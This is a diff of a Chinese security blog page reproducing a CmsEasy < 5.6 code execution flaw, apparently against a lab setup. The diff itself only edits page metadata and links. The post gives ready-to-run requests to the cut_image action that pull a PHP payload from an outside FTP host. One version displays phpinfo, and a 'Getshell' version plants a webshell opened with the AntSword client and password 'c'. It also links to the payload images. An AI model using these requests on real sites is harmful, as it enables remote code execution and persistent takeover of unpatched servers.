@@ -9,8 +9,8 @@
     <meta name="keywords" content="W4nde3&#39;s Secret">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="CmsEasy &amp;lt; 5.6  代码执行漏洞复现phpinfo准备好匿名访问的FTP server，将payload图片上传到ftp目录下。POST访问搭建好的漏洞环境：
-http://45.32.74.108:8000/index.p">
+    <meta name="description" content="CmsEasy &amp;lt; 5.6  代码执行漏洞复现phpinfo准备好匿名访问的FTP server，将payload图片上传到ftp目录下POST访问搭建好的漏洞环境：
+http://45.32.74.108:8000/index.ph">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -627,7 +627,7 @@ http://45.32.74.108:8000/index.p">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        981
+                        1k
                     </div>
                     
 
@@ -651,10 +651,10 @@ http://45.32.74.108:8000/index.p">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CmsEasy-lt-5-6-代码执行漏洞"><a href="#CmsEasy-lt-5-6-代码执行漏洞" class="headerlink" title="CmsEasy < 5.6  代码执行漏洞"></a>CmsEasy &lt; 5.6  代码执行漏洞</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>准备好匿名访问的FTP server，将payload图片上传到ftp目录下。<br>POST访问搭建好的漏洞环境：</p>
+                <h1 id="CmsEasy-lt-5-6-代码执行漏洞"><a href="#CmsEasy-lt-5-6-代码执行漏洞" class="headerlink" title="CmsEasy < 5.6  代码执行漏洞"></a>CmsEasy &lt; 5.6  代码执行漏洞</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>准备好匿名访问的FTP server，将<a href="http://cloud.iwonder.run/#s/6ZK4ARUg" target="_blank" rel="noopener">payload图片</a>上传到ftp目录下<br>POST访问搭建好的漏洞环境：</p>
 <pre><code>http://45.32.74.108:8000/index.php?case=tool&amp;act=cut_image</code></pre><p>post-data:</p>
 <pre><code>pic=1ftp://108.160.128.46/poc_phpinfo_700x1120.php&amp;w=700&amp;h=1120&amp;x1=0&amp;x2=700&amp;y1=0&amp;y2=1120</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/451f9107518fd86e.png" alt=""><br>得到上传文件的地址，访问之～<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/cbd6be74fe27e8c3.png" alt=""></p>
-<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>POST访问搭建好的漏洞环境</p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>准备好匿名访问的FTP server，将[payload图片](<a href="http://cloud.iwonder.run/#s/6ZK3" target="_blank" rel="noopener">http://cloud.iwonder.run/#s/6ZK3</a>    6exg)上传到ftp目录下<br>POST访问搭建好的漏洞环境</p>
 <pre><code>http://45.32.74.108:8000/index.php?case=tool&amp;act=cut_image</code></pre><p>post-data:</p>
 <pre><code>pic=1ftp://108.160.128.46/exp_eval_post_c_700x1120.php&amp;w=700&amp;h=1120&amp;x1=0&amp;x2=700&amp;y1=0&amp;y2=1120</code></pre><p>得到上传文件的地址，蚁剑连密码为c<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/11/42cf4c151b3de053.png" alt=""></p>
 <h3 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h3><p>利用脚本生成自己的图片payload</p>
@@ -713,7 +713,7 @@ http://45.32.74.108:8000/index.p">
                     </span>
                     <a href="https://blog.iwonder.run" class="b-link-green">W4nde3's Secret</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/11/11/cmseasy-5.6-qian-tai-getshell/" class="b-link-green"></a>
+                    <a href="/2020/11/11/cmseasy-5.6-getshell/" class="b-link-green"></a>
                 </p>
             </div>
 
@@ -740,7 +740,7 @@ http://45.32.74.108:8000/index.p">
                 <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2020/11/11/cmseasy-5.6-qian-tai-getshell/">
+                <a href="/2020/11/11/cmseasy-5.6-getshell/">
                     <div class="card-image">
                         
                         
@@ -752,8 +752,8 @@ http://45.32.74.108:8000/index.p">
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CmsEasy &lt; 5.6  代码执行漏洞复现phpinfo准备好匿名访问的FTP server，将payload图片上传到ftp目录下。POST访问搭建好的漏洞环境：
-http://45.32.74.108:8000/index.p
+                            CmsEasy &lt; 5.6  代码执行漏洞复现phpinfo准备好匿名访问的FTP server，将payload图片上传到ftp目录下POST访问搭建好的漏洞环境：
+http://45.32.74.108:8000/index.ph
                         
                     </div>
                     <div class="publish-info">
